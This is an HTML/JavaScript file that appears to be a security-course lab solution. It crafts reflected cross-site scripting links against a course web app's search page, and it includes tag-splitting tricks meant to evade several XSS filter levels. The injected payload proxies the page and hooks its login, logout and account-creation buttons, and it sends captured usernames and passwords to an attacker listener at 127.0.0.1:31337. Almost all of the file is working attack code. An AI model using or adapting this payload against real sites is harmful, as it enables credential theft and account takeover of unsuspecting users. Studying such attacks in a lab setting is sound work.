<html>
<meta charset="utf-8">
<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js">
</script>
<script>
			// $(`a:contains(`script`)`).hide(); $(`a:contains(`sscriptcript`)`).hide();

			// $(`a`).contains(`sscriptcript`).hide(); 

function payload3() {
	var a=`http://127.0.0.1:31337/`
	function proxy(href, purl, stat) {
		$(`html`).load(href, function(){
		$(`html`).show();
			var realURL = window.location.href; 
			$(`a`).each(function() {
			    if(this.href.indexOf(`sscriptcript`)!=-1||this.href.indexOf(`script`)!=-1){
			        $(this).hide();}});
			history.replaceState(window.history.state, `/project3`, `/project3`);
		    $(`#search-btn`).click(function(e){
		      var q = $(`#query`).val().split(` `).join(`+`);
			  $.get(`http://cis551.cis.upenn.edu/project3/search?q=` + q, 
			  function(e){document.write(e);});
			  e.preventDefault();
  		      proxy(`http://cis551.cis.upenn.edu/project3/search?q=` + q, realURL, 1);
	        });
	        $(`#search-again-btn`).click(function(e){
		      e.preventDefault();
			  window.location.replace(purl);
	        }); 
		    $(`#log-in-btn`).click(function(e){
		      e.preventDefault();
			  $.post(`http://cis551.cis.upenn.edu/project3/login?csrfdefense=0&xssdefense=3`, 
			  {username: $(`#username`).val(), password: $(`#userpass`).val()});
			  $.get(a+`stolen?event=login&user=`+$(`#username`).val()+`&pass=`+$(`#userpass`).val());
			  window.location.replace(realURL);
	        }); 
		    $(`#new-account-btn`).click(function(e){
		      e.preventDefault();
			  $.post(`http://cis551.cis.upenn.edu/project3/create?csrfdefense=0&xssdefense=3`, 
			  {username: $(`#username`).val(), password: $(`#userpass`).val()}) 
			  window.location.replace(realURL);
	        }); 
		    $(`#log-out-btn`).click(function(e){
		      e.preventDefault();
			  $.post(`http://cis551.cis.upenn.edu/project3/logout?csrfdefense=0&xssdefense=3`)
			  $.get(a + `stolen?event=logout&user=`+$(`#logged-in-user`).text());
		      if (stat == 0) {
		      	  alert(`hey`+realURL);
				  window.location.replace(realURL);
		      } else {
		      	  alert(`ho`+purl);
				  window.location.replace(purl);
		      }
	        }); 
			});
		}
	$(`html`).hide();
	proxy(`./`, `./`, 0);
}

function payload(attacker) {
	function proxy(href, purl, stat) {
		$("html").load(href, function(){
		$("html").show();
			var realURL = window.location.href;
			console.log(window.history.state);
			history.replaceState(window.history.state, '/project3', "/project3"); 
			$('a:contains("<script>")').hide(); $('a:contains("<sscriptcript>")').hide();
		    $("#search-btn").click(function(e){
		      var q = $("#query").val().split(' ').join('+');
			  $.get("http://cis551.cis.upenn.edu/project3/search?q=" + q, 
			  function(e){document.write(e);});
			  e.preventDefault();
		      alert(realURL);
  		      proxy("http://cis551.cis.upenn.edu/project3/search?q=" + q, realURL, 1);
	        }); 
	        $("#search-again-btn").click(function(e){
		      e.preventDefault();
		      alert(0)
			  window.location.replace(purl);
	        }); 
		    $("#log-in-btn").click(function(e){
		      e.preventDefault();
			  $.post("http://cis551.cis.upenn.edu/project3/login?csrfdefense=0", 
			  {username: $('#username').val(), password: $('#userpass').val()});
			  $.get(attacker+"stolen?event=login&user="+$('#username').val()+"&pass=" +$('#userpass').val());
			  window.location.replace(realURL);
	        }); 
		    $("#new-account-btn").click(function(e){
		      e.preventDefault();
			  $.post("http://cis551.cis.upenn.edu/project3/create?csrfdefense=0", 
			  {username: $('#username').val(), password: $('#userpass').val()}) 
			  window.location.replace(realURL);
	        }); 
		    $("#log-out-btn").click(function(e){
		      e.preventDefault();
			  $.post("http://cis551.cis.upenn.edu/project3/logout?csrfdefense=0")
			  $.get(attacker + "stolen?event=logout&user="+$('#logged-in-user').text());
			  window.location.replace(realURL);
		      if (stat == 0) {
		      	  alert(`hey`+realURL);
				  window.location.replace(realURL);
		      } else {
		      	  alert(`ho`+purl);
				  window.location.replace(purl);
		      }
	        }); 
			});
		}
	$("html").hide();
	proxy("./", "./", 0);
}

// function to test payload before the actual payload
function test() {
	alert(4);
}

function makeLink(xssdefense, target, attacker) {
		if (xssdefense == 0) {
			return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
			encodeURIComponent("<script" + ">" + payload.toString() +
			";payload(\"" + attacker + "\");" + "</" + "script" + ">");
		} else if (xssdefense == 1) {
			return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
			encodeURIComponent("<sscriptcript" + ">" + payload.toString() +
			";payload(\"" + attacker + "\");" + "</" + "sscriptcript" + ">");
		} else if (xssdefense == 2) {
			return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
			encodeURIComponent("<sscriptcript" + ">" + payload.toString() +
			";payload(\"" + attacker + "\");" + "</" + "sscriptcript" + ">");
		} else if (xssdefense == 3) {
			return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
			encodeURIComponent("<script" + ">" + payload3.toString() +
			";payload3();" + "</" + "script" + ">");
		}
	}

	var xssdefense = 2;
	var target = "http://cis551.cis.upenn.edu/project3/";
	var attacker = "http://127.0.0.1:31337/";

	$(function() {
		var url = makeLink(xssdefense, target, attacker);
		$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Yay!</a>");
	});
</script>

<h3></h3>
</html>